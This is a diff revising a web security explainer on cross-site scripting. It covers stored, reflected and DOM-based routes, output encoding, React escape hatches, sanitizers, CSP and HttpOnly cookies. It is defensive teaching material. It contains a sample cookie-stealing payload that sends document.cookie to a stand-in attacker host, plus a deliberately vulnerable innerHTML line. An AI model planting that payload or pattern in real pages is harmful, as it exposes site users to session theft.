@@ -1,75 +1,54 @@
 ---
 title: Cross-Site Scripting (XSS)
-summary: How attacker-controlled input ends up running as JavaScript in another user's browser, and why context-aware output encoding is the fix.
+summary: Attacker-controlled text becomes JavaScript running in another user's browser unless it is encoded for the place it lands, so let the framework encode and treat everything else as a backstop.
 date: 2026-09-14
 ---
 
-Cross-site scripting (XSS) is [SQL injection](/security/sql-injection)'s
-sibling on the front end: an attacker gets their own JavaScript to run in
-another user's browser, in the context of your site. It happens whenever
-untrusted input is written into a page without being encoded for the
-place it lands.
+Picture a blog with a comment box. A visitor types a comment, your server stores it, and every later reader sees it under the post. What happens if the comment is not text, but code?
+
+That is cross-site scripting (XSS): an attacker gets their own JavaScript to run in another user's browser, with the privileges of your site. It is [SQL injection](/security/sql-injection)'s sibling on the front end. SQL injection smuggles code into a query; XSS smuggles it into a page. In both, untrusted input is mixed into something a parser will interpret, and the parser cannot tell the data from the instructions.
+
+Here is the blog's rendering code, with the mistake in it:
 
 ```js
-// vulnerable — comment text is parsed as HTML, so <script> runs
+// vulnerable: the comment is parsed as HTML, not shown as text
 container.innerHTML = `<p>${comment}</p>`;
 ```
 
-If `comment` is `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
-that code runs for everyone who views the comment.
+Suppose the comment is `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`. The browser parses it as an image tag, the image fails to load (there is no image at `x`), and the `onerror` handler runs. That code now executes for everyone who opens the post.
 
-## Three ways the payload reaches the page
+## What can the attacker do from there?
 
-- **Stored** — the payload is saved (a comment, a profile field) and served
-  to every viewer.
-- **Reflected** — the payload rides in a request (a URL query param) and is
-  echoed straight back into the response. A typical version: the attacker
-  sends a victim a link with the payload in the query string, the victim's
-  browser requests that URL, the server writes the parameter straight into
-  the response, and the victim's browser runs it as part of the page it
-  just loaded.
-- **DOM-based** — client-side JS reads attacker-controlled input
-  (`location.hash`, `postMessage`) and writes it into the DOM.
+The injected script runs in the reader's **origin**, meaning the combination of scheme, host and port that the browser uses to decide what a script may touch. So it can do anything your own page's script can do. It can read anything JavaScript can read (cookies without the `HttpOnly` flag, which hides a cookie from scripts, tokens kept in `localStorage`), send requests to your server as the logged-in reader, record keystrokes, and rewrite the page to show a fake login form. The reader never did anything wrong except open a post.
 
-Whichever route it takes, the injected script ends up running with the
-victim's session and origin. It can read cookies and tokens, make
-authenticated requests as the user, log keystrokes, rewrite the page, or
-pivot to other attacks. It's a permanent fixture of the **OWASP Top 10** —
-a periodically updated ranking of the web's most critical security risks —
-and the vulnerable line usually looks completely ordinary.
+## How does the payload reach the page?
 
-## Let the framework encode it, don't strip tags by hand
+There are three routes, and the blog can suffer all of them:
 
-Encode data for the context it's being inserted into — HTML body, HTML
-attribute, JavaScript string, and URL each need different escaping. In
-practice, don't do this by hand: use a templating layer that auto-escapes,
-and let the framework build the DOM.
+- **Stored.** The payload is saved, as in the comment above, and served to every viewer. One submission reaches everyone, which makes it the most damaging kind.
+- **Reflected.** The payload travels in the request and is echoed straight into the response. If the blog's search page prints "No results for ..." using the `?q=` parameter, an attacker can email a victim a link with the payload in `q`. The victim's browser requests it, the server writes the parameter into the page, and the browser runs it.
+- **DOM-based.** The server is innocent. Client-side script reads attacker-controlled input, such as `location.hash` or a `postMessage` payload, and writes it into the page itself.
+
+## What is the fix?
+
+Encode data for the place it is going. A comment inside an HTML body needs `<` turned into `&lt;`, so the browser shows a bracket instead of opening a tag. A value inside an HTML attribute, a JavaScript string or a URL each needs different escaping, which is why hand-rolled filters fail. So don't encode by hand: use a templating layer that escapes automatically and let it build the page.
 
 ```jsx
-// safe — React escapes the interpolated string automatically, so a
-// comment containing "<script>" renders as inert text, not a tag
+// safe: React escapes the string, so "<img ...>" shows up as visible text
 <p>{comment}</p>
 
-// vulnerable — this opts back out of that escaping entirely
+// vulnerable: this opts out of the escaping
 <div dangerouslySetInnerHTML={{ __html: comment }} />
 ```
 
-React, and templating layers like it, escape any string you interpolate
-into normal markup by default; you only get XSS back if you reach for
-`dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `document.write` with
-untrusted data.
+React escapes anything you interpolate into markup. You get XSS back only by reaching for an escape hatch: `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `document.write`, or a URL you did not check (a link whose `href` begins with `javascript:` runs code when clicked). Search your codebase for those names and you have found the places worth reviewing.
 
-Layer on a **Content-Security-Policy** header as defense in depth — it can
-block inline scripts and unknown script origins even if an injection slips
-through — and set session cookies `HttpOnly` so a successful XSS still
-can't read them (see [Session vs. Token Authentication](/security/session-vs-token-auth)).
+What if the blog wants comments with bold and italics, so it must allow some HTML? Then you cannot escape everything. Run the comment through a maintained **sanitizer** (a library that parses the HTML and keeps only an allowlist of safe tags and attributes), and do not write that filter yourself.
 
-## It applies anywhere untrusted data reaches the DOM
+Why not simply strip out `<script>`? Because the attack above never used it. Event handlers like `onerror`, `javascript:` URLs and odd encodings all run code, and attackers keep finding new ones. A blocklist chases the attacker; encoding at the boundary removes the problem.
 
-User-generated content, URL parameters, `postMessage` payloads, `Referer`,
-even "safe-looking" fields like display names and error messages — treat
-every one of them as hostile until it's been through the encoder. The
-underlying rule is identical to SQL injection's: keep data and code
-separate, and let the platform encode at the boundary, not "strip out
-`<script>`," which attackers route around with event handlers,
-`javascript:` URLs, and encoding tricks.
+## What if one slips through anyway?
+
+Add layers, because one missed escape is enough. A **Content-Security-Policy** (CSP) is a response header telling the browser which script sources it may run. A policy that bans inline scripts and unknown origins would have stopped the `onerror` payload. Setting session cookies `HttpOnly` hides them from JavaScript, so a successful XSS cannot steal the cookie. It can still send requests as the user while the page is open, which is why `HttpOnly` limits the damage and does not prevent the attack. The same reasoning is behind the advice in [JSON Web Tokens](/security/jwt) to avoid keeping long-lived tokens in storage that scripts can read.
+
+**Rule of thumb.** Treat every string that did not come from your own code as hostile, including display names, error messages and URL parameters. Let an auto-escaping framework encode it for where it lands, sanitize with a library when you must allow HTML, and keep a CSP and `HttpOnly` cookies as the backstop.
